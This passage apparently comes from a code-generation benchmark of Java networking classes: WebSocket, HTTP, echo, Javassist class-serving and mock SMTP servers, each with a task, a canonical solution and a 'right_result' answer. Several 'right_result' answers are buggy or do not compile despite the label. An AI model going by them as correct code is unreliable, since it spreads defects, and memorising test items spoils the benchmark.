    "Instruction": "Task Description: Create a WebSocket server class in Java that handles WebSocket connections, performs WebSocket handshake, and sends binary frames to clients.\n\nClass Description: The WebSocketServer class implements a basic WebSocket server that listens for incoming connections, performs the WebSocket handshake protocol, and sends binary data frames to connected clients. It supports configurable masking and frame size.\n\nAttributes:\n- serverSocket: ServerSocket - The server socket used to listen for incoming connections\n- port: int - The port number on which the server listens for connections\n\nMethods:\n- WebSocketServer(int port) -> None - Constructor that initializes the server with the specified port number\n- start() -> void - Starts the server by creating and binding the server socket\n- handleConnection() -> void - Handles an incoming connection, performs WebSocket handshake, and sends binary frames\n- stop() -> void - Stops the server by closing the server socket\n\nThe class should:\n1. Accept incoming TCP connections\n2. Parse WebSocket handshake headers\n3. Generate proper handshake response\n4. Create and send binary frames with configurable masking and size\n5. Properly close connections and clean up resources",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.OutputStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.Scanner;\nimport org.java_websocket.util.Charsetfunctions;\nimport org.java_websocket.util.KeyUtils;\nimport org.java_websocket.drafts.Draft_6455;\nimport org.java_websocket.framing.BinaryFrame;\nimport java.nio.ByteBuffer;\n\npublic class WebSocketServer {\n\n    private ServerSocket serverSocket;\n    private int port;\n\n    public WebSocketServer(int port) {\n        this.port = port;\n    }\n\n    public void start() throws IOException {\n        serverSocket = new ServerSocket(port);\n        serverSocket.setReuseAddress(true);\n    }\n\n    public void handleConnection() throws IOException, InterruptedException {\n        Socket client = serverSocket.accept();\n        Scanner in = new Scanner(client.getInputStream());\n        String input;\n        String seckey = \"\";\n        String testCase;\n        boolean useMask = false;\n        int size = 0;\n        OutputStream os = client.getOutputStream();\n\n        while (in.hasNext()) {\n            input = in.nextLine();\n            if (input.startsWith(\"Sec-WebSocket-Key: \")) {\n                seckey = input.split(\" \")[1];\n            }\n            if (input.startsWith(\"Upgrade\")) {\n                os.write(Charsetfunctions.asciiBytes(\n                    \"HTTP/1.1 101 Websocket Connection Upgrade\\r\\nUpgrade: websocket\\r\\nConnection: Upgrade\\r\\n\"\n                        + KeyUtils.getSecKey(seckey) + \"\\r\\n\"));\n                os.flush();\n                Thread.sleep(10);\n                Draft_6455 draft_6455 = new Draft_6455();\n                BinaryFrame binaryFrame = new BinaryFrame();\n                binaryFrame.setPayload(ByteBuffer.allocate(size));\n                binaryFrame.setTransferemasked(useMask);\n                ByteBuffer byteBuffer = draft_6455.createBinaryFrame(binaryFrame);\n                byte[] bytes = byteBuffer.array();\n                int first = size / 2;\n                os.write(bytes, 0, first);\n                os.flush();\n                Thread.sleep(5);\n                os.write(bytes, first, bytes.length - first);\n                os.flush();\n                break;\n            }\n            if (input.startsWith(\"GET \")) {\n                testCase = input.split(\" \")[1];\n                String[] strings = testCase.split(\"/\");\n                useMask = Boolean.valueOf(strings[1]);\n                size = Integer.valueOf(strings[2]);\n            }\n        }\n        client.close();\n    }\n\n    public void stop() throws IOException {\n        serverSocket.close();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "import java.io.*;\nimport java.net.*;\nimport java.util.*;\n\npublic class WebSocketServer {\n    private ServerSocket serverSocket;\n    private int port;\n    private boolean useMasking = true;\n    private int maxFrameSize = 125;\n\n    public WebSocketServer(int port) {\n        this.port = port;\n    }\n\n    public void start() throws IOException {\n        serverSocket = new ServerSocket(port);\n        System.out.println(\"WebSocket server started on port \" + port);\n        while (true) {\n            Socket socket = serverSocket.accept();\n            new Thread(new ConnectionHandler(socket)).start();\n        }\n    }\n\n    public void stop() {\n        try {\n            if (serverSocket != null) {\n                serverSocket.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private class ConnectionHandler implements Runnable {\n        private Socket socket;\n\n        public ConnectionHandler(Socket socket) {\n            this.socket = socket;\n        }\n\n        @Override\n        public void run() {\n            try (\n                InputStream input = socket.getInputStream();\n                OutputStream output = socket.getOutputStream()\n            ) {\n                handleConnection(input, output);\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private void handleConnection(InputStream input, OutputStream output) throws IOException {\n        byte[] buffer = new byte[1024];\n        int bytesRead = input.read(buffer);\n        String request = new String(buffer, 0, bytesRead);\n\n        if (request.startsWith(\"GET /ws HTTP/1.1\")) {\n            String response = \"HTTP/1.1 101 Switching Protocols\\r\\n\" +\n                    \"Upgrade: websocket\\r\\n\" +\n                    \"Connection: Upgrade\\r\\n\" +\n                    \"Sec-WebSocket-Accept: \" + generateAcceptKey() + \"\\r\\n\\r\\n\";\n            output.write(response.getBytes());\n            output.flush();\n\n            sendBinaryFrames(output);\n        } else {\n            socket.close();\n        }\n    }\n\n    private String generateAcceptKey() {\n        return \"dGhlIHNlYXJjaHJlZCByYW5kb20=\";\n    }\n\n    private void sendBinaryFrames(OutputStream output) throws IOException {\n        byte[] data = new byte[256];\n        for (int i = 0; i < data.length; i++) {\n            data[i] = (byte) (i % 256);\n        }\n\n        int start = 0;\n        while (start < data.length) {\n            int end = Math.min(start + maxFrameSize, data.length);\n            byte[] frameData = Arrays.copyOfRange(data, start, end);\n            byte[] frame = createFrame(frameData);\n            output.write(frame);\n            output.flush();\n            start = end;\n        }\n    }\n\n    private byte[] createFrame(byte[] payload) throws IOException {\n        int payloadLength = payload.length;\n        byte[] frameHeader = new byte[2];\n        int headerIndex = 0;\n\n        frameHeader[headerIndex++] = 0x82; // Binary opcode with FIN\n\n        if (payloadLength <= 125) {\n            frameHeader[headerIndex++] = (byte) payloadLength;\n        } else if (payloadLength <= 65535) {\n            frameHeader[headerIndex++] = (byte) 126;\n            frameHeader[headerIndex++] = (byte) (payloadLength & 0xFF);\n            frameHeader[headerIndex++] = (byte) (payloadLength >> 8);\n        } else {\n            throw new IllegalArgumentException(\"Payload too large\");\n        }\n\n        byte[] frame = new byte[frameHeader.length + payload.length];\n        System.arraycopy(frameHeader, 0, frame, 0, frameHeader.length);\n        System.arraycopy(payload, 0, frame, frameHeader.length, payload.length);\n\n        if (useMasking) {\n            byte[] mask = generateMask();\n            applyMask(payload, mask, frame, frameHeader.length);\n        }\n\n        return frame;\n    }\n\n    private byte[] generateMask() {\n        Random rand = new Random();\n        byte[] mask = new byte[4];\n        for (int i = 0; i < 4; i++) {\n            mask[i] = (byte) rand.nextInt(256);\n        }\n        return mask;\n    }\n\n    private void applyMask(byte[] payload, byte[] mask, byte[] frame, int payloadStart) {\n        for (int i = 0; i < payload.length; i++) {\n            frame[payloadStart + i] ^= mask[i % 4];\n        }\n    }\n}"
  },
  {
    "Task_id": 537,
    "Instruction": "Task Description: Implement a simple HTTP server class that listens for incoming client connections on a dynamically assigned port and responds with a \"Not Implemented\" HTTP status. The server should be able to handle basic client requests and clean up resources properly when closed.\n\nClass Description: The HTTPServer class implements a basic HTTP server using Java's ServerSocket. It runs in a separate thread to handle incoming connections and responds with a fixed HTTP 501 response. The class implements AutoCloseable for proper resource management.\n\nAttributes:\n- server: [ServerSocket] - The underlying ServerSocket instance that listens for incoming connections\n- thread: [Thread] - The thread in which the server runs to handle client connections asynchronously\n\nMethods:\n- HTTPServer() throws [IOException] -> [void] - Constructor that initializes the ServerSocket on a random available port and starts the server thread\n- port() -> [int] - Returns the local port number on which the server is listening\n- serve() -> [void] - Private method that handles incoming client connections and sends HTTP responses (runs in the server thread)\n- close() throws [Exception] -> [void] - Closes the server socket and waits for the server thread to terminate (implements AutoCloseable)",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.net.SocketException;\nimport java.nio.charset.StandardCharsets;\n\npublic class HTTPServer implements AutoCloseable {\n    private final ServerSocket server;\n    private final Thread thread;\n\n    public HTTPServer() throws IOException {\n        server = new ServerSocket(0, 1);\n        thread = new Thread(new Runnable() {\n            @Override public void run() {\n                serve();\n            }\n        });\n        thread.start();\n    }\n\n    public final int port() {\n        return server.getLocalPort();\n    }\n\n    private void serve() {\n        try {\n            Socket client = server.accept();\n\n            try (InputStream inputStream = client.getInputStream()) {\n                while (inputStream.available() > 0) {\n                    if (inputStream.read() == -1) {\n                        break;\n                    }\n                }\n\n                try (OutputStream outputStream = client.getOutputStream()) {\n                    outputStream.write(\"HTTP/1.0 501 Not Implemented\\r\\n\\r\\n\".getBytes(StandardCharsets.UTF_8));\n                }\n            }\n        }\n        catch (IOException e) {\n            if (server.isClosed() && e instanceof SocketException) {\n                return;\n            }\n            throw new RuntimeException(e);\n        }\n    }\n\n    @Override public void close() throws Exception {\n        server.close();\n        thread.join();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "import java.io.*;\nimport java.net.*;\n\npublic class HTTPServer implements AutoCloseable {\n    private ServerSocket server;\n    private Thread thread;\n    private boolean running;\n    private int port;\n\n    public HTTPServer() throws IOException {\n        server = new ServerSocket(0);\n        this.port = server.getLocalPort();\n        thread = new Thread(this::serve);\n        thread.start();\n    }\n\n    public int port() {\n        return this.port;\n    }\n\n    public void serve() {\n        while (running) {\n            try {\n                Socket client = server.accept();\n                OutputStream out = client.getOutputStream();\n                out.write(\"HTTP/1.1 501 Not Implemented\\r\\n\\r\\n\".getBytes());\n                out.flush();\n                client.close();\n            } catch (IOException e) {\n                // Handle exception, but for simplicity, just continue\n            }\n        }\n    }\n\n    public void close() throws Exception {\n        if (server != null) {\n            server.close();\n            running = false;\n            thread.join();\n        }\n    }\n}"
  },
  {
    "Task_id": 551,
    "Instruction": "Task Description: Create a Java class that implements a simple HTTP server capable of handling GET requests, serving both static files and dynamically generated class files through Javassist's ClassPool mechanism.\n\nClass Description: The Webserver class is a multi-threaded HTTP server that listens for incoming connections on a specified port. It can serve both static files from the filesystem and dynamically generated bytecode through Javassist's class manipulation capabilities. The server follows basic HTTP/1.0 protocol and handles each client connection in a separate thread.\n\nAttributes:\n- socket: ServerSocket - The main server socket listening for incoming connections\n- classPool: ClassPool - Javassist class pool for dynamic class generation\n- translator: Translator - Optional translator for class manipulation\n- endofline: byte[] - Constant for HTTP line endings (CRLF)\n\nMethods:\n- Webserver(int port) -> void - Constructor that initializes the server socket on the specified port\n- setClassPool(ClassPool loader) -> void - Sets the Javassist ClassPool for dynamic class generation\n- addTranslator(ClassPool cp, Translator t) -> void - Configures both ClassPool and Translator for advanced class manipulation\n- end() -> void - Closes the server socket and stops the server\n- run() -> void - Main server loop that accepts connections and spawns service threads\n- process(Socket clnt) -> void - Processes an individual client connection (handles HTTP protocol)\n- readLine(InputStream in) -> String - Reads a line of input from the client\n- skipLine(InputStream in) -> int - Skips a line of input from the client\n- doReply(InputStream in, OutputStream out, String cmd) -> void - Processes the HTTP request and generates appropriate response\n- letUsersSendClassfile(OutputStream out, String filename, int length) -> boolean - Handles dynamic class file generation and transmission\n- sendHeader(OutputStream out, long dataLength, int filetype) -> void - Sends HTTP response headers\n- replyError(OutputStream out, BadHttpRequest e) -> void - Sends HTTP error response",
    "Canonical_solution": "import java.io.BufferedInputStream;\nimport java.io.BufferedOutputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.File;\nimport java.io.FileInputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.Date;\n\npublic class Webserver {\n    private ServerSocket socket;\n    private ClassPool classPool;\n    protected Translator translator;\n\n    private final static byte[] endofline = { 0x0d, 0x0a };\n\n    public Webserver(int port) throws IOException {\n        socket = new ServerSocket(port);\n        classPool = null;\n        translator = null;\n    }\n\n    public void setClassPool(ClassPool loader) {\n        classPool = loader;\n    }\n\n    public void addTranslator(ClassPool cp, Translator t)\n        throws NotFoundException, CannotCompileException\n    {\n        classPool = cp;\n        translator = t;\n        t.start(classPool);\n    }\n\n    public void end() throws IOException {\n        socket.close();\n    }\n\n    public void run() {\n        System.err.println(\"ready to service...\");\n        for (;;)\n            try {\n                ServiceThread th = new ServiceThread(this, socket.accept());\n                th.start();\n            }\n            catch (IOException e) {\n                System.out.println(e.toString());\n            }\n    }\n\n    final void process(Socket clnt) throws IOException {\n        InputStream in = new BufferedInputStream(clnt.getInputStream());\n        String cmd = readLine(in);\n        while (skipLine(in) > 0){\n        }\n\n        OutputStream out = new BufferedOutputStream(clnt.getOutputStream());\n        try {\n            doReply(in, out, cmd);\n        }\n        catch (BadHttpRequest e) {\n            replyError(out, e);\n        }\n\n        out.flush();\n        in.close();\n        out.close();\n        clnt.close();\n    }\n\n    private String readLine(InputStream in) throws IOException {\n        StringBuffer buf = new StringBuffer();\n        int c;\n        while ((c = in.read()) >= 0 && c != 0x0d)\n            buf.append((char)c);\n\n        in.read();      /* skip 0x0a (LF) */\n        return buf.toString();\n    }\n\n    private int skipLine(InputStream in) throws IOException {\n        int c;\n        int len = 0;\n        while ((c = in.read()) >= 0 && c != 0x0d)\n            ++len;\n\n        in.read();      /* skip 0x0a (LF) */\n        return len;\n    }\n\n    public void doReply(InputStream in, OutputStream out, String cmd)\n        throws IOException, BadHttpRequest\n    {\n        int len;\n        int fileType;\n        String filename, urlName;\n\n        if (cmd.startsWith(\"GET /\"))\n            filename = urlName = cmd.substring(5, cmd.indexOf(' ', 5));\n        else\n            throw new BadHttpRequest();\n\n        len = filename.length();\n        if (letUsersSendClassfile(out, filename, len))\n            return;\n\n        checkFilename(filename, len);\n        File file = new File(filename);\n        if (file.canRead()) {\n            sendHeader(out, file.length(), typeClass);\n            FileInputStream fin = new FileInputStream(file);\n            byte[] filebuffer = new byte[4096];\n            for (;;) {\n                len = fin.read(filebuffer);\n                if (len <= 0)\n                    break;\n                out.write(filebuffer, 0, len);\n            }\n\n            fin.close();\n            return;\n        }\n\n        throw new BadHttpRequest();\n    }\n\n    private boolean letUsersSendClassfile(OutputStream out,\n                                          String filename, int length)\n        throws IOException, BadHttpRequest\n    {\n        if (classPool == null)\n            return false;\n\n        byte[] classfile;\n        String classname\n            = filename.substring(0, length - 6).replace('/', '.');\n        try {\n            if (translator != null)\n                translator.onLoad(classPool, classname);\n\n            CtClass c = classPool.get(classname);\n            classfile = c.toBytecode();\n        }\n        catch (Exception e) {\n            throw new BadHttpRequest(e);\n        }\n\n        sendHeader(out, classfile.length, typeClass);\n        out.write(classfile);\n        return true;\n    }\n\n    private void sendHeader(OutputStream out, long dataLength, int filetype)\n        throws IOException\n    {\n        out.write(\"HTTP/1.0 200 OK\".getBytes());\n        out.write(endofline);\n        out.write(\"Content-Length: \".getBytes());\n        out.write(Long.toString(dataLength).getBytes());\n        out.write(endofline);\n        out.write(\"Content-Type: application/octet-stream\".getBytes());\n        out.write(endofline);\n        out.write(endofline);\n    }\n\n    private void replyError(OutputStream out, BadHttpRequest e)\n        throws IOException\n    {\n        out.write(\"HTTP/1.0 400 Bad Request\".getBytes());\n        out.write(endofline);\n        out.write(endofline);\n        out.write(\"<H1>Bad Request</H1>\".getBytes());\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport javassist.*;\nimport java.util.*;\n\npublic class Webserver {\n    private ServerSocket socket;\n    private ClassPool classPool;\n    private Translator translator;\n    private byte[] endofline = \"\\r\\n\".getBytes();\n\n    public Webserver(int port) {\n        try {\n            socket = new ServerSocket(port);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void setClassPool(ClassPool loader) {\n        this.classPool = loader;\n    }\n\n    public void addTranslator(ClassPool cp, Translator t) {\n        this.classPool = cp;\n        this.translator = t;\n    }\n\n    public void end() {\n        try {\n            if (socket != null) {\n                socket.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void run() {\n        while (true) {\n            try {\n                Socket clnt = socket.accept();\n                new Thread(new ClientHandler(clnt)).start();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    public void process(Socket clnt) {\n        try {\n            InputStream in = clnt.getInputStream();\n            OutputStream out = clnt.getOutputStream();\n            String requestLine = readLine(in);\n            if (requestLine == null) {\n                return;\n            }\n            String[] parts = requestLine.split(\"\\\\s+\");\n            if (parts.length < 2) {\n                replyError(out, new BadHttpRequest(\"Invalid request\"));\n                return;\n            }\n            String cmd = parts[0];\n            String filename = parts[1];\n            doReply(in, out, cmd, filename);\n        } catch (Exception e) {\n            e.printStackTrace();\n        } finally {\n            try {\n                clnt.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private String readLine(InputStream in) throws IOException {\n        StringBuilder sb = new StringBuilder();\n        byte[] buffer = new byte[1024];\n        int bytesRead;\n        while ((bytesRead = in.read(buffer)) != -1) {\n            sb.append(new String(buffer, 0, bytesRead));\n            if (buffer[bytesRead - 1] == '\\r' && bytesRead > 0 && bytesRead < buffer.length) {\n                if (buffer[bytesRead - 2] == '\\n') {\n                    break;\n                }\n            }\n        }\n        return sb.toString();\n    }\n\n    private int skipLine(InputStream in) throws IOException {\n        int count = 0;\n        byte[] buffer = new byte[1024];\n        int bytesRead;\n        while ((bytesRead = in.read(buffer)) != -1) {\n            count += bytesRead;\n            if (buffer[bytesRead - 1] == '\\r' && bytesRead > 0 && bytesRead < buffer.length) {\n                if (buffer[bytesRead - 2] == '\\n') {\n                    return count;\n                }\n            }\n        }\n        return count;\n    }\n\n    private void doReply(InputStream in, OutputStream out, String cmd, String filename) {\n        try {\n            if (cmd.equals(\"GET\")) {\n                if (filename.endsWith(\".class\")) {\n                    if (letUsersSendClassfile(out, filename, 0)) {\n                        sendHeader(out, (long) 0, 1);\n                    } else {\n                        replyError(out, new BadHttpRequest(\"Invalid class file\"));\n                    }\n                } else {\n                    File file = new File(filename);\n                    if (file.exists()) {\n                        long fileSize = file.length();\n                        sendHeader(out, fileSize, 0);\n                        byte[] data = Files.readAllBytes(file.toPath());\n                        out.write(data);\n                        out.flush();\n                    } else {\n                        replyError(out, new BadHttpRequest(\"File not found\"));\n                    }\n                }\n            } else {\n                replyError(out, new BadHttpRequest(\"Invalid command\"));\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private boolean letUsersSendClassfile(OutputStream out, String filename, int length) {\n        try {\n            CtClass cc = classPool.makeClass(filename);\n            String source = translator.generateClassBody();\n            cc.setSourceCode(source);\n            byte[] bytes = cc.toBytecode();\n            out.write(bytes);\n            out.flush();\n            return true;\n        } catch (Exception e) {\n            return false;\n        }\n    }\n\n    private void sendHeader(OutputStream out, long dataLength, int filetype) {\n        try {\n            String header = \"HTTP/1.0 200 OK\\r\\n\";\n            if (filetype == 1) {\n                header += \"Content-Type: application/octet-stream\\r\\n\";\n            } else {\n                header += \"Content-Type: text/html\\r\\n\";\n            }\n            header += \"Content-Length: \" + dataLength + \"\\r\\n\\r\\n\";\n            out.write(header.getBytes());\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void replyError(OutputStream out, BadHttpRequest e) {\n        try {\n            String error = \"HTTP/1.0 400 Bad Request\\r\\nContent-Type: text/plain\\r\\nContent-Length: \" + e.getMessage().length() + \"\\r\\n\\r\\n\" + e.getMessage();\n            out.write(error.getBytes());\n        } catch (IOException e2) {\n            e2.printStackTrace();\n        }\n    }\n\n    private class ClientHandler implements Runnable {\n        private Socket clnt;\n\n        public ClientHandler(Socket clnt) {\n            this.clnt = clnt;\n        }\n\n        public void run() {\n            try {\n                process(clnt);\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 554,
    "Instruction": "Task Description: Create a Java class that implements a simple TCP echo server using ServerSocket to listen for client connections, receive messages, and send them back to the client with an \"ECHO : \" prefix until the client sends \"bye\" or an empty message.\n\nClass Description: The EchoServer class represents a TCP server that echoes back received messages to connected clients. It handles client connections, message processing, and resource cleanup.\n\nAttributes:\n- server: [ServerSocket] - The server socket listening for incoming connections\n- client: [Socket] - The socket representing the connected client\n- out: [PrintStream] - Output stream to send data to the client\n- buf: [BufferedReader] - Input stream to read data from the client\n- flag: [boolean] - Control flag for the server's main loop\n\nMethods:\n- EchoServer(int port) -> [void] - Constructor that initializes the server socket on the specified port\n- start() -> [void] - Starts the server, accepts client connections, and begins echoing messages\n- close() -> [void] - Closes client and server sockets to release resources",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.io.PrintStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class EchoServer {\n\n    private ServerSocket server;\n    private Socket client;\n    private PrintStream out;\n    private BufferedReader buf;\n    private boolean flag;\n\n    public EchoServer(int port) throws Exception {\n        server = new ServerSocket(port);\n        flag = true;\n    }\n\n    public void start() throws Exception {\n        System.out.println(\"\u670d\u52a1\u5668\u8fd0\u884c\uff0c\u7b49\u5f85\u5ba2\u6237\u7aef\u8fde\u63a5\u3002\");\n        client = server.accept();\n        out = new PrintStream(client.getOutputStream());\n        buf = new BufferedReader(new InputStreamReader(client.getInputStream()));\n        while (flag) {\n            String str = buf.readLine();\n            if (str == null || \"\".equals(str)) {\n                flag = false;\n            } else {\n                if (\"bye\".equals(str)) {\n                    flag = false;\n                } else {\n                    out.println(\"ECHO : \" + str);\n                }\n            }\n        }\n    }\n\n    public void close() throws Exception {\n        client.close();\n        server.close();\n    }\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\n\npublic class EchoServer {\n    private ServerSocket server;\n    private Socket client;\n    private PrintStream out;\n    private BufferedReader buf;\n    private boolean flag;\n\n    public EchoServer(int port) {\n        server = new ServerSocket(port);\n        flag = true;\n    }\n\n    public void start() {\n        while (flag) {\n            try {\n                client = server.accept();\n                out = new PrintStream(client.getOutputStream());\n                buf = new BufferedReader(new InputStreamReader(client.getInputStream()));\n                String line;\n                while ((line = buf.readLine()) != null) {\n                    if (line.trim().equals(\"bye\") || line.isEmpty()) {\n                        break;\n                    }\n                    out.println(\"ECHO : \" + line);\n                }\n                client.close();\n                out.close();\n                buf.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    public void close() {\n        try {\n            if (server != null) server.close();\n            if (client != null) client.close();\n            if (out != null) out.close();\n            if (buf != null) buf.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        flag = false;\n    }\n}\n```"
  },
  {
    "Task_id": 559,
    "Instruction": "Task Description: Create a mock SMTP server implementation in Java that can simulate SMTP interactions, handle TLS upgrades, and manage client connections for testing purposes.\n\nClass Description: MockSmtpServer is a test utility class that simulates an SMTP server with support for plaintext and TLS connections. It maintains a queue of expected interactions and processes them sequentially when clients connect.\n\nAttributes:\n- interactions: Deque<SmtpInteraction> - A thread-safe queue of expected SMTP interactions (commands, responses, TLS upgrades)\n- waitForConnectionClosed: CountDownLatch - Synchronization aid to wait for client disconnection\n- waitForAllExpectedCommands: CountDownLatch - Synchronization aid to wait for all expected commands to be processed\n- keyStoreProvider: KeyStoreProvider - Provides SSL/TLS keystore information\n- logger: Logger - Logging interface for server activities\n- mockServerThread: MockServerThread - The server thread handling client connections\n- host: String - The server's host address\n- port: int - The server's listening port\n\nMethods:\n- start() -> void - Starts the server on a random available port and begins listening for connections\n- shutdown() -> void - Stops the server and closes all connections\n- MockServerThread(ServerSocket, Deque<SmtpInteraction>, CountDownLatch, CountDownLatch, Logger, KeyStoreProvider) -> void - Inner class constructor for the server thread\n- run() -> void - Main server thread execution handling client connections and SMTP protocol\n- readExpectedCommand(ExpectedCommand) -> void - Reads and verifies an expected command from the client\n- writeCannedResponse(CannedResponse) -> void - Writes a predefined response to the client\n- upgradeToTls(Socket) -> void - Upgrades the connection to TLS using the provided keystore\n- shouldStop() -> void - Signals the server thread to stop processing\n\nNested Classes/Interfaces:\n- SmtpInteraction: Interface - Marker interface for SMTP interaction types\n- ExpectedCommand: Class - Represents an expected SMTP command from the client\n- CannedResponse: Class - Represents a predefined server response\n- UpgradeToTls: Class - Marker for TLS upgrade interaction\n- Logger: Interface - Logging interface for server activities",
    "Canonical_solution": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.security.KeyManagementException;\nimport java.security.KeyStore;\nimport java.security.KeyStoreException;\nimport java.security.NoSuchAlgorithmException;\nimport java.security.UnrecoverableKeyException;\nimport java.security.cert.CertificateException;\nimport java.util.Deque;\nimport java.util.concurrent.ConcurrentLinkedDeque;\nimport java.util.concurrent.CountDownLatch;\nimport javax.net.ssl.KeyManagerFactory;\nimport javax.net.ssl.SSLContext;\nimport javax.net.ssl.SSLSocket;\nimport javax.net.ssl.SSLSocketFactory;\nimport okio.BufferedSink;\nimport okio.BufferedSource;\nimport okio.Okio;\n\npublic class MockSmtpServer {\n    private final Deque<SmtpInteraction> interactions = new ConcurrentLinkedDeque<>();\n    private final CountDownLatch waitForConnectionClosed = new CountDownLatch(1);\n    private final CountDownLatch waitForAllExpectedCommands = new CountDownLatch(1);\n    private final KeyStoreProvider keyStoreProvider;\n    private final Logger logger;\n\n    private MockServerThread mockServerThread;\n    private String host;\n    private int port;\n\n    public MockSmtpServer(KeyStoreProvider keyStoreProvider, Logger logger) {\n        this.keyStoreProvider = keyStoreProvider;\n        this.logger = logger;\n    }\n\n    public void start() throws IOException {\n        InetAddress localAddress = InetAddress.getByName(null);\n        ServerSocket serverSocket = new ServerSocket(0, 1, localAddress);\n        host = serverSocket.getInetAddress().getHostAddress();\n        port = serverSocket.getLocalPort();\n\n        mockServerThread = new MockServerThread(serverSocket, interactions, waitForConnectionClosed,\n                waitForAllExpectedCommands, logger, keyStoreProvider);\n        mockServerThread.start();\n    }\n\n    public void shutdown() {\n        mockServerThread.shouldStop();\n    }\n\n    private static class MockServerThread extends Thread {\n        private final ServerSocket serverSocket;\n        private final Deque<SmtpInteraction> interactions;\n        private final CountDownLatch waitForConnectionClosed;\n        private final CountDownLatch waitForAllExpectedCommands;\n        private final Logger logger;\n        private final KeyStoreProvider keyStoreProvider;\n\n        private volatile boolean shouldStop = false;\n        private volatile Socket clientSocket;\n        private BufferedSource input;\n        private BufferedSink output;\n\n        public MockServerThread(ServerSocket serverSocket, Deque<SmtpInteraction> interactions,\n                CountDownLatch waitForConnectionClosed, CountDownLatch waitForAllExpectedCommands, Logger logger,\n                KeyStoreProvider keyStoreProvider) {\n            this.serverSocket = serverSocket;\n            this.interactions = interactions;\n            this.waitForConnectionClosed = waitForConnectionClosed;\n            this.waitForAllExpectedCommands = waitForAllExpectedCommands;\n            this.logger = logger;\n            this.keyStoreProvider = keyStoreProvider;\n        }\n\n        @Override\n        public void run() {\n            try {\n                Socket socket = serverSocket.accept();\n                serverSocket.close();\n                clientSocket = socket;\n\n                input = Okio.buffer(Okio.source(socket));\n                output = Okio.buffer(Okio.sink(socket));\n\n                while (!shouldStop && !interactions.isEmpty()) {\n                    SmtpInteraction interaction = interactions.pop();\n                    if (interaction instanceof ExpectedCommand) {\n                        readExpectedCommand((ExpectedCommand) interaction);\n                    } else if (interaction instanceof CannedResponse) {\n                        writeCannedResponse((CannedResponse) interaction);\n                    } else if (interaction instanceof UpgradeToTls) {\n                        upgradeToTls(socket);\n                    }\n                }\n\n                waitForAllExpectedCommands.countDown();\n                waitForConnectionClosed.countDown();\n            } catch (IOException | KeyStoreException | NoSuchAlgorithmException | \n                    CertificateException | UnrecoverableKeyException | KeyManagementException e) {\n                if (!shouldStop) {\n                    logger.log(\"Exception: %s\", e);\n                }\n            } finally {\n                try {\n                    clientSocket.close();\n                } catch (IOException e) {\n                    logger.log(\"Error closing socket: %s\", e);\n                }\n            }\n        }\n\n        private void readExpectedCommand(ExpectedCommand expectedCommand) throws IOException {\n            String command = input.readUtf8Line();\n            logger.log(\"C: %s\", command);\n        }\n\n        private void writeCannedResponse(CannedResponse cannedResponse) throws IOException {\n            String response = cannedResponse.getResponse();\n            logger.log(\"S: %s\", response);\n            output.writeUtf8(response);\n            output.writeUtf8(\"\\r\\n\");\n            output.flush();\n        }\n\n        private void upgradeToTls(Socket socket) throws KeyStoreException, IOException, NoSuchAlgorithmException,\n                CertificateException, UnrecoverableKeyException, KeyManagementException {\n            KeyStore keyStore = keyStoreProvider.getKeyStore();\n            KeyManagerFactory keyManagerFactory = KeyManagerFactory.getInstance(\n                    KeyManagerFactory.getDefaultAlgorithm());\n            keyManagerFactory.init(keyStore, keyStoreProvider.getPassword());\n\n            SSLContext sslContext = SSLContext.getInstance(\"TLS\");\n            sslContext.init(keyManagerFactory.getKeyManagers(), null, null);\n            SSLSocket sslSocket = (SSLSocket) sslContext.getSocketFactory().createSocket(\n                    socket, socket.getInetAddress().getHostAddress(), socket.getPort(), true);\n            sslSocket.setUseClientMode(false);\n            sslSocket.startHandshake();\n\n            input = Okio.buffer(Okio.source(sslSocket.getInputStream()));\n            output = Okio.buffer(Okio.sink(sslSocket.getOutputStream()));\n        }\n\n        public void shouldStop() {\n            shouldStop = true;\n            try {\n                clientSocket.close();\n            } catch (IOException e) {\n                logger.log(\"Error closing socket: %s\", e);\n            }\n        }\n    }\n\n    private interface SmtpInteraction {}\n    private static class ExpectedCommand implements SmtpInteraction {\n        private final String command;\n        public ExpectedCommand(String command) {\n            this.command = command;\n        }\n    }\n    private static class CannedResponse implements SmtpInteraction {\n        private final String response;\n        public CannedResponse(String response) {\n            this.response = response;\n        }\n    }\n    private static class UpgradeToTls implements SmtpInteraction {}\n    public interface Logger {\n        void log(String format, Object... args);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
